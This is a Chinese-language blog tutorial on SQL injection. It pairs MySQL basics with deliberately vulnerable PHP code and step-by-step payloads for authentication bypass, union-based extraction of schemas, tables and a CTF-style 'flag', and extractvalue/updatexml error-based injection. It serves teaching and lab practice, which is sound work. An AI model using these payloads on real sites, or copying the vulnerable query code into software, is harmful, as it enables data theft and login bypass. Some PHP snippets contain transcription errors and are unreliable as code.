@@ -1,0 +1,621 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SQL注入 | Vareca</title><meta name="author" content="Vareca"><meta name="copyright" content="Vareca"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="数据库基础知识数据库就是用来存放数据的仓库。 RDBMS 指关系型数据库管理系统。RDBMS 中的数据存储在被称为表的数据库对象中。 表是相关的数据项的集合，它由列和行组成。 库—表—列—行  重要的库：Information_schema库​	information_schema 是MySQL中的一个信息数据库。它存储了数据库管理系统自身的元数据，包括数据库、表、列、索引等对象的定义信息，还有用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入">
+<meta property="og:url" content="https://vareca.me/2025/02/21/SQL_injection/index.html">
+<meta property="og:site_name" content="Vareca">
+<meta property="og:description" content="数据库基础知识数据库就是用来存放数据的仓库。 RDBMS 指关系型数据库管理系统。RDBMS 中的数据存储在被称为表的数据库对象中。 表是相关的数据项的集合，它由列和行组成。 库—表—列—行  重要的库：Information_schema库​	information_schema 是MySQL中的一个信息数据库。它存储了数据库管理系统自身的元数据，包括数据库、表、列、索引等对象的定义信息，还有用">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://skymirror-1331175479.cos.ap-beijing.myqcloud.com/Vareca.jpg">
+<meta property="article:published_time" content="2025-02-21T10:23:12.430Z">
+<meta property="article:modified_time" content="2024-12-06T10:51:51.539Z">
+<meta property="article:author" content="Vareca">
+<meta property="article:tag" content="持续施工中">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://skymirror-1331175479.cos.ap-beijing.myqcloud.com/Vareca.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "SQL注入",
+  "url": "https://vareca.me/2025/02/21/SQL_injection/",
+  "image": "https://skymirror-1331175479.cos.ap-beijing.myqcloud.com/Vareca.jpg",
+  "datePublished": "2025-02-21T10:23:12.430Z",
+  "dateModified": "2024-12-06T10:51:51.539Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Vareca",
+      "url": "https://vareca.me/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="https://skymirror-1331175479.cos.ap-beijing.myqcloud.com/Vareca.jpg"><link rel="canonical" href="https://vareca.me/2025/02/21/SQL_injection/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SQL注入',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://skymirror-1331175479.cos.ap-beijing.myqcloud.com/Vareca.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: linear-gradient(20deg,#ff2af2,#07f6ff);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Vareca</span></a><a class="nav-page-title" href="/"><span class="site-name">SQL注入</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">SQL注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-02-21T10:23:12.430Z" title="发表于 2025-02-21 18:23:12">2025-02-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-12-06T10:51:51.539Z" title="更新于 2024-12-06 18:51:51">2024-12-06</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web/">web</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>24分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="数据库基础知识"><a href="#数据库基础知识" class="headerlink" title="数据库基础知识"></a>数据库基础知识</h1><p>数据库就是用来存放数据的仓库。</p>
+<p>RDBMS 指关系型数据库管理系统。RDBMS 中的数据存储在被称为表的数据库对象中。</p>
+<p>表是相关的数据项的集合，它由列和行组成。</p>
+<p style="color:red">库—表—列—行</p>
+
+<h3 id="重要的库：Information-schema库"><a href="#重要的库：Information-schema库" class="headerlink" title="重要的库：Information_schema库"></a>重要的库：Information_schema库</h3><p>​	information_schema 是MySQL中的一个信息数据库。它存储了数据库管理系统自身的元数据，包括数据库、表、列、索引等对象的定义信息，还有用户权限等相关内容。以下列举常用的三个表，并以缩进代表层级，以粗体显示重要的列。</p>
+<p>把 information_schema 库想象成一个巨大的图书馆索引系统。这个“索引系统”有许多“书架”（表）。</p>
+<p><span style="color:blue">information_schema库</span>（图书馆索引系统）</p>
+<ul>
+<li><p><span style="color:blue">SCHEMATA表</span>：它就像是图书馆的楼层索引，记录着每个“楼层”（数据库）的信息，包括数据库名称、字符集等基本信息。</p>
+<ul>
+<li><p><span style="color:blue">SCHEMA_NAME</span>：数据库名称，这是最重要的字段之一，通过它可以识别每个数据库。</p>
+</li>
+<li><p><span style="color:blue">DEFAULT_CHARACTER_SET_NAME</span>：数据库默认的字符集名称，比如utf8、latin1等，它决定了数据库中存储文本数据的编码方式。</p>
+</li>
+<li><p><span style="color:blue">DEFAULT_COLLATION_NAME</span>：数据库默认的排序规则，用于对数据库中的字符数据进行排序和比较操作。</p>
+</li>
+</ul>
+</li>
+<li><p><span style="color:blue">TABLES表</span>：相当于每个楼层里书架的索引。记录着每个“书架”（表）所属的“楼层”（数据库）、“书架”名称、表的类型（如MyISAM、InnoDB等）等内容。</p>
+<ul>
+<li><p><b style="color:blue">TABLE_SCHEMA</b>：所属数据库的名称，用于关联 SCHEMATA 表，表明该表位于哪个数据库中。</p>
+</li>
+<li><p><b style="color:blue">TABLE_NAME</b>：表的名称，用于唯一标识数据库中的每个表。</p>
+</li>
+<li><p><span style="color:blue">ENGINE</span>：存储引擎类型，例如InnoDB、MyISAM等。不同的存储引擎有不同的特性，如InnoDB支持事务和外键约束，而MyISAM在一些简单的读写场景下速度可能更快。</p>
+</li>
+<li><p><span style="color:blue">TABLE_TYPE</span>：表的类型，通常是“BASE TABLE”（基本表）或“VIEW”（视图），基本表用于存储实际的数据，视图是基于SQL查询的虚拟表。</p>
+</li>
+<li><p><span style="color:blue">TABLE_ROWS</span>：一个估计的表中的行数，这个数字可能不是完全精确的，但可以给用户一个表大小的大致概念。</p>
+</li>
+</ul>
+</li>
+<li><p><span style="color:blue">COLUMNS表</span>：可以看作是每个书架上书籍的详细索引。详细记录了每列（“书籍”）所属的“书架”（表）、列名、数据类型、列的排序规则等信息。</p>
+<ul>
+<li><span style="color:blue">TABLE_SCHEMA</span>：所属数据库的名称，和 TABLES 表中的 TABLE_SCHEMA 字段关联，用于确定列所属的数据库。</li>
+<li><b style="color:blue">TABLE_NAME</b>：所属表的名称，用于确定列所属的表，和 TABLES 表中的 TABLE_NAME 字段关联。</li>
+<li><b style="color:blue">COLUMN_NAME</b>：列的名称，用于唯一标识表中的每个列。</li>
+<li><span style="color:blue">DATA_TYPE</span>：列的数据类型，如INT（整数型）、VARCHAR（可变长字符串）、DATE（日期型）等，它决定了列可以存储的数据种类和格式。</li>
+<li><span style="color:blue">COLUMN_TYPE</span>：更详细的列类型信息，包括数据类型、长度、是否有符号等内容。例如，对于一个VARCHAR列，它可能显示为“VARCHAR(255)”，表示最大长度为255个字符。</li>
+<li><span style="color:blue">IS_NULLABLE</span>：表示列是否可以为空值（NULL），值为“YES”或“NO”，用于约束列的数据输入。</li>
+</ul>
+</li>
+</ul>
+<h3 id="数据库命令"><a href="#数据库命令" class="headerlink" title="数据库命令"></a>数据库命令</h3><ol>
+<li>查看当前MySQL服务器中有哪些数据库  <span style="color:blue">show databases;</span></li>
+<li>数据库名创建新的数据库  <span style="color:blue">create database;</span></li>
+<li>切换数据库  <span style="color:blue">use 数据库名;</span></li>
+<li>查看当前正在使用的数据库  <span style="color:blue">select database();</span></li>
+<li>删除数据库  <span style="color:blue">drop database 数据库名</span>;</li>
+<li>查看当前数据库中有那些表  <span style="color:blue">show tables</span>;</li>
+<li>查询表结构  <span style="color:blue">desc 表名;</span></li>
+<li>查询表中的数据  <span style="color:blue">select * from 表名;</span></li>
+</ol>
+<h3 id="Select查询语句"><a href="#Select查询语句" class="headerlink" title="Select查询语句"></a>Select查询语句</h3><p>基本格式</p>
+<p><span style="color:blue">Select 列名from 表名;</span></p>
+<p><span style="color:blue">Select username from user;</span></p>
+<p>查询多个列</p>
+<p><span style="color:blue">Select 列名1，列名2 from 表名;</span></p>
+<p><span style="color:blue">Select username,password from user;</span></p>
+<p>查询所有列</p>
+<p><span style="color:blue">Select * from 表名;</span></p>
+<p><span style="color:blue">Select * from user;</span></p>
+<p>使用where语句进行条件查询</p>
+<p><span style="color:blue">Select 列名 from 表名 where 列名 &#x3D; ‘xx’;</span></p>
+<p><span style="color:blue">Select * from user where username &#x3D; ‘admin’;</span></p>
+<h3 id="Insert插入语句"><a href="#Insert插入语句" class="headerlink" title="Insert插入语句"></a>Insert插入语句</h3><p>插入数据有三种形式</p>
+<p><span style="color:blue">Insert into 表名 (列名1,列名2列名3) values (值1,值2，值3);</span></p>
+<p><span style="color:blue">Insert into user (id,username,password) values (3, ‘test’, ‘test123’);</span></p>
+<p>省略列名形式</p>
+<p><span style="color:blue">Insert into 表名 values (值1,值2,值3);</span></p>
+<p><span style="color:blue">Insert into user values(4, ‘test2’ , ‘abcd’);</span></p>
+<p>使用set关键字插入数据</p>
+<p><span style="color:blue">Insert into 表名 set 列名1&#x3D;值1, 列名2&#x3D;值2, 列名3&#x3D;值3;</span></p>
+<p><span style="color:blue">nsert into user set id &#x3D; 5, username &#x3D; ‘test3’, password &#x3D; ‘1234564’;</span></p>
+<h3 id="Updata更新操作"><a href="#Updata更新操作" class="headerlink" title="Updata更新操作"></a>Updata更新操作</h3><p>基本格式</p>
+<p><span style="color:blue">Update 表名 set 列名 &#x3D; 新值 where 列名 &#x3D; 值;</span></p>
+<p><span style="color:blue">Update user set password &#x3D; ‘abc123’ where username &#x3D; ‘test’;</span></p>
+<p>更新多个列</p>
+<p><span style="color:blue">Update user set username &#x3D; ‘tests’, password &#x3D; ‘123’ where id &#x3D; 3;</span></p>
+<p>省略条件更新表中的一列数据</p>
+<p><span style="color:blue">Update 表名 set 列名 &#x3D; 新值;</span></p>
+<p><span style="color:blue">Update user set password &#x3D; ‘456789’;</span></p>
+<h3 id="Delet删除操作"><a href="#Delet删除操作" class="headerlink" title="Delet删除操作"></a>Delet删除操作</h3><p>删除表中的一行数据</p>
+<p><span style="color:blue">Delete from 表名 where 列名 &#x3D; 值;</span></p>
+<p><span style="color:blue">Delete from user where username &#x3D; tests;</span></p>
+<p>使用in关键字删除表中的多行数据</p>
+<p><span style="color:blue">Delete from 表名 where 列名 in (需要删除的行);</span></p>
+<p><span style="color:blue">Delete from user where id in (4,5);</span></p>
+<p>删除表中的所有数据</p>
+<p><span style="color:blue">Delete from 表名 Delete from user;</span></p>
+<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>以下示例均是GET类型，POST类型闭合前面代码即可。</p>
+<p><strong>包含漏洞的php代码示例</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUESTI</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">    <span class="comment">//从用户请求中获取id参数</span></span><br><span class="line">	<span class="variable">$id</span> =<span class="variable">$_REQUESTI</span> <span class="string">&#x27;id&#x27;</span> <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">	<span class="comment">// Check database</span></span><br><span class="line">    <span class="comment">//然后直接将id参数的值拼接进SQL语句，进行SQL查询</span></span><br><span class="line">	squery = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">	<span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>( <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">	<span class="comment">// Get results</span></span><br><span class="line">	<span class="variable">$num</span> = <span class="title function_ invoke__">mysql_numrows</span>( <span class="variable">$result</span> );</span><br><span class="line">	<span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>( <span class="variable">$i</span> &lt; <span class="variable">$num</span> )&#123;</span><br><span class="line">	    <span class="comment">// Get values</span></span><br><span class="line">	    <span class="variable">$first</span> = <span class="title function_ invoke__">mysql_result</span>( <span class="variable">$result</span>, <span class="variable">$i</span>, <span class="string">&quot;first_name&quot;</span> );</span><br><span class="line">	    <span class="variable">$last</span> = <span class="title function_ invoke__">mysql_result</span>( <span class="variable">$result</span>, <span class="variable">$i</span>, <span class="string">&quot;last_name&quot;</span> );</span><br><span class="line">    </span><br><span class="line">	    <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="comment">//输出查询结果</span></span><br><span class="line">	    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>cbr /&gt;First name: &#123;sfirst&#125;cbr /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">	    <span class="comment">// Increase loop count</span></span><br><span class="line">	    <span class="variable">$i</span>++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上述代码未对用户输入的参数进行过滤，用户可以向参数中传入sql语句进行拼接，最终拿到敏感信息</p>
+<h3 id="注入点判断"><a href="#注入点判断" class="headerlink" title="注入点判断"></a>注入点判断</h3><p><strong>数字型参数</strong></p>
+<p>观察URL或表单数据中的数字参数，例如在 ?id&#x3D;1 这样的链接中， id 为数字型参数。可以在参数后添加数学运算来测试，如 <code>?id=1+1</code> 。如果页面返回的结果符合运算后的预期（如 id 变为 2 后的结果），则可能存在注入点。还可以使用逻辑判断语句，如 <code>?id=1 and 1=1</code> 和 <code>?id=1 and 1=2</code> 。若 <code>?id=1 and 1=1</code> 返回正常内容， <code>?id=1 and 1=2</code> 返回异常（如错误提示或空白页面），则很可能是注入点。</p>
+<p>服务器代码示例</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_POST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"><span class="variable">$mysql</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(“localhost<span class="string">&quot;, &quot;</span>root<span class="string">&quot;,&quot;</span>root<span class="string">&quot;,&quot;</span>web<span class="string">&quot;);</span></span><br><span class="line"><span class="string"><span class="subst">$query</span> = &quot;</span>select * <span class="keyword">from</span> user where id = <span class="variable">$id</span>;<span class="string">&quot;;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>字符型参数</strong></p>
+<p>对于字符型参数，通常在SQL语句中会被单引号包裹。比如用户名或密码输入框。可以尝试闭合单引号并添加注释符号，如在用户名框输入 <code>admin&#39; --+</code> (+与空格的url编码相同，防止空格被吞, –+也可用<code>#</code>或<code>%23</code>代替)。若能成功绕过验证（如登录成功或查询到数据），则可能存在注入点。也可以使用逻辑判断语句，如 <code>admin&#39; or &#39;1&#39;=&#39;1</code> 。若能以此绕过验证，也说明可能是注入点。</p>
+<p>服务器代码示例</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (@<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]&amp;&amp;<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$mysql</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;web&quot;</span>);</span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;select * from user where username=&#x27;&quot;</span>.Susername.<span class="string">&quot;&#x27;and password=&#x27;&quot;</span>.<span class="variable">$password</span>.<span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">    <span class="comment">#var_dump($query);</span></span><br><span class="line">    <span class="variable">$row</span>=<span class="variable">$mysql</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line">    <span class="comment">#var_dump($row);</span></span><br><span class="line">    <span class="variable">$result</span>=<span class="variable">$row</span>-&gt;<span class="title function_ invoke__">fetch_all</span>();</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>搜索框参数</strong></p>
+<p>在搜索框中输入单引号或其他特殊字符，如 <code>&#39; or 1=1</code> 。观察页面是否返回异常结果或者全部数据，若是，则可能存在注入点。</p>
+<p><strong>通过观察错误信息判断</strong></p>
+<p>故意在输入框或URL参数中输入可能导致SQL错误的字符，如单引号、双引号、分号、注释符、括号、运算符等。如果页面返回类似 You have an error in your SQL syntax 的错误信息，就有可能存在SQL注入点。此时可以进一步利用这些错误信息来构造注入语句。</p>
+<h3 id="Union联合查询"><a href="#Union联合查询" class="headerlink" title="Union联合查询"></a>Union联合查询</h3><p>当攻击者能够控制部分查询结果的显示，并且知道原始查询的列数和数据类型等信息时使用。这种情况常见于存在SQL注入点的查询是一个 SELECT 语句，且返回的结果会在页面上显示。例如，在一个产品展示页面，原始查询是 SELECT * FROM products WHERE category &#x3D; ‘books’ ，并且产品信息会在页面上显示。</p>
+<ul>
+<li>基本格式</li>
+</ul>
+<p>​	Select 列 from 表 [where 条件] union 其他查询语句；</p>
+<ul>
+<li>步骤(以MySQL为例)</li>
+</ul>
+<ol>
+<li>查找注入点</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1 and 1=1%23</span><br><span class="line">#测试是数字型or字符型，实际操作中可能还需结合报错等进行判断语句格式</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>测试列数</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1 order by 3%23</span><br><span class="line">#实际操作中不断尝试order by的值直到找到不会报错的最大值</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>测试回显位</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,2,3%23</span><br><span class="line">#union前后两条sql语句的列数必须一致</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>拿数据库名</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1, schema_name,3 from information_schema.schemata%23</span><br><span class="line">#select语句中可以使用group_concat()函数合并字符串</span><br></pre></td></tr></table></figure>
+
+<p>​	或者</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,database(),3%23</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>拿表名</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,table_name,3 from information_ schema.tables where table_schema=database()%23</span><br></pre></td></tr></table></figure>
+
+<ol start="6">
+<li>拿列名</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,column_name, 3 from information_schema.columns where table_name= &#x27;flag&#x27; %23</span><br></pre></td></tr></table></figure>
+
+<ol start="7">
+<li>拿数据</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,flag,3 from flag%23</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>通常在无法使用union联合注入时使用。当应用程序没有正确处理SQL错误，会将错误信息显示在页面上时，通过构造特殊的注入语句，使数据库返回包含敏感信息的错误信息，从而获取数据。例如，在一个简单的测试环境网站，没有对SQL错误进行处理，错误信息会直接显示在页面上。</p>
+<p>使用函数：</p>
+<p><strong>1. <span style="color:red">extractvalue()函数（MySQL）</span></strong></p>
+<p>函数语法：<code>extractvalue(XML_document, XPath_string)</code> </p>
+<p>其中 XML_document 要求是一个格式良好的XML文档内容， XPath_string 是一个XPath路径表达式。</p>
+<p>例如： extractvalue(1,concat(0x7e,(database()),0x7e)) ，这里 1 不是一个有效的XML文档，构造这样的语句会引发报错。 concat 函数用于拼接字符串， 0x7e 是<code>~</code>的十六进制表示，用于在报错信息中标记数据库名称的位置，这样在报错信息中就能获取数据库名称。</p>
+<p><strong>2. <span style="color:red">updatexml()函数（MySQL）</span></strong></p>
+<p>函数语法：<code>updatexml(XML_document, XPath_string, new_value)</code></p>
+<p> XML_document 是XML文档， XPath_string 是XPath路径， new_value 是要更新的值。和 extractvalue 函数类似，也是通过构造错误参数引发报错来获取信息。</p>
